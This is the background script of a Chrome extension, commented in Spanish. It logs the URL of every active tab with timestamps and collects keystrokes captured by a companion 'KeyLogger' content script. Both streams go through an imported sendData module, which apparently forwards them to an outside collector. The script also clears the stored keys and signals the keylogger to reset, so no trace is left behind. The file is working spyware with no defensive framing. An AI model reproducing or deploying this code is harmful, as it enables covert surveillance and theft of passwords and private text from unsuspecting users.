'use strict';

import { sendData } from './SendModule.js';

//última URL enviada
var oldUrl = ""
var cadena = []
//pestaña actual
var currentTab = 0 

//cuando se cambia la pestaña activa o se cierra una pestaña----------------------------------------- 
chrome.tabs.onRemoved.addListener(function(tabId, removeInfo) {
	checkData(currentTab);	
});
chrome.tabs.onActivated.addListener(function(tabId, removeInfo) {
	checkData(currentTab);	
});

//al abrir nueva ventana limpia posibles datos residuales de cache-----------------------------------
window.addEventListener('load', function (event) {
	chrome.storage.local.clear();
});

//al cerrar la ventana envia los datos que queden y limpia el almacenamiento-------------------------
window.addEventListener('beforeunload', function (event) {
	checkData(currentTab);
	currentTab = null; //evitamos el error dentro del evento onBeforeRequest(no hay tab activas)
	chrome.storage.local.clear();
});

//Activa con cada webRequest------------------------------------------------------------------------- 
chrome.webRequest.onBeforeRequest.addListener(function(details){	
	if (currentTab != null){ // Si la pestaña está activa (no se ha cerrado la ventana)
		chrome.tabs.getSelected(null,function(tab){
			if ((tab.url != null) && (tab.url != "chrome://newtab/")&& (checkForURLchange(tab.url))){
		  		currentTab = tab.id;
		  		var date = new Date (details.timeStamp);
		  		var pageInfo = {
		  			IdTab: tab.id,
					Url: tab.url,
					Time: date.toLocaleString()
				};
				sendData(JSON.stringify(pageInfo),0);
				checkData(tab.id);
	   		}
	   	});
	}	
  },
  { urls: ["<all_urls>"],}
);

//Comprueba si ha cambiado la URL y actualiza el valor de oldUrl------------------------------------
function checkForURLchange(currentUrl) {
	if (oldUrl != currentUrl) {
		console.log ('true ' + oldUrl + ' '+currentUrl);
		oldUrl = currentUrl;
		return true;
	}else {
		console.log('false ' + oldUrl + ' '+currentUrl);
		return false;
	}
}

//Comprueba los datos volcados en el almacenamiento por el KeyLogger y los envia---------------------    
function checkData(tabId){
		chrome.storage.local.get(['keys'], function(result) {
        	if (result.keys) {
        		var date = new Date();
          		var pageInfo = {
          			IdTab: tabId,
          			Keys: result.keys,
          			Time: date.toLocaleString()
          		}
          		sendData(JSON.stringify(pageInfo),1);
          		chrome.storage.local.remove(['keys']); //borramos el Item
          		//enviamos la orden para que KeyLogger vacie la cadena
          		chrome.tabs.sendMessage(tabId, {Identifier: 'borrar'}); 
        	}
        });
};

//recorre un array con las id de las pestañas --------------------------------------------------------
function exitsTabid(tabId)
{
	var x 
	for (var x=0; x<cadena.length; x++){
		if (cadena[x] == tabId){
			return true;
		}
	};
	cadena.push(tabId); 
	return false;
};

//Incluir retardos en milisegundos---------------------------------------------------------------- 
function sleep(milliSeconds){
	var startTime = new Date().getTime();
	while (new Date().getTime() < startTime + milliSeconds);
}